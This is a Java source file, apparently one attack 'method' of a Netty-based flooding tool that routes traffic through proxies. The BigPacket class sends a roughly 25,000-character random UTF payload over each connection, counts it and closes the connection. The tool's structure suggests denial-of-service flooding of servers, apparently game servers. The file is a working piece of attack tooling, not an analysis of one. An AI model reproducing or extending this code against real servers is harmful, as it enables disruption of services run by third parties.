package IO.SYVERIS.methods;

import IO.SYVERIS.utils.NettyBootstrap;
import IO.SYVERIS.utils.ProxyLoader;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import java.io.IOException;
import java.security.SecureRandom;

public class BigPacket implements Method {
   SecureRandom r = new SecureRandom();
   String lol = "";
   final int a = 25555;

   public BigPacket() {
      for(int i = 1; i < this.a + 1; ++i) {
         this.lol = this.lol + String.valueOf((char)(this.r.nextInt(125) + 1));
      }

   }

   public void accept(Channel channel, ProxyLoader.Proxy proxy) {
      ByteBuf b = Unpooled.buffer();
      ByteBufOutputStream out = new ByteBufOutputStream(b);

      try {
         out.writeUTF(this.lol);
         out.close();
      } catch (IOException var6) {
         var6.printStackTrace();
      }

      channel.writeAndFlush(b);
      ++NettyBootstrap.integer;
      ++NettyBootstrap.totalConnections;
      channel.close();
   }
}
